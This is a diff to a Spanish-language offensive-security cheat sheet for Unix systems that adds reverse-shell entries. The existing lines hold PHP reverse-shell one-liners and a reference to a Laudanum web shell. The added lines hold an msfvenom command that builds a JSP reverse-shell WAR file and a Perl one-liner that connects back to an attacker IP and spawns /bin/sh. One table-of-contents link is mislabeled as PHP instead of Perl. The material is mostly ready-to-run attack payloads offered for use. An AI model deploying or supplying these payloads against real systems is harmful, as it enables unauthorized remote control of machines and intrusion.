@@ -13,6 +13,8 @@
     - [Netcat](#Netcat)   
     - [Python](#Python)
     - [PHP](#PHP)
+    - [PHP](#Perl)
+    - [War msfvenom](#War)
   - [Spawneando una shell mejor](#Spawning-a-TTY-shell)   
   - [Transferencia de Archivos](#Transfiriendo-Archivos)
     - [HTTP](#HTTP)
@@ -66,6 +68,14 @@ Técnicas para utilizar en sistemas basados en unix
   php -r '$sock=fsockopen("10.10.10.10",9001);system("bash <&3 >&3 2>&3");'
   php -r '$sock=fsockopen("10.10.10.10",9001);passthru("bash <&3 >&3 2>&3");'
   Laudanum common reverse shell /usr/share/webshells/laudanum/php/php-reverse-shell.php
+  ```
+#### War
+  ```bash
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
+  ```
+#### Perl
+  ```bash
+  perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```
  
 ### Spawning a TTY shell
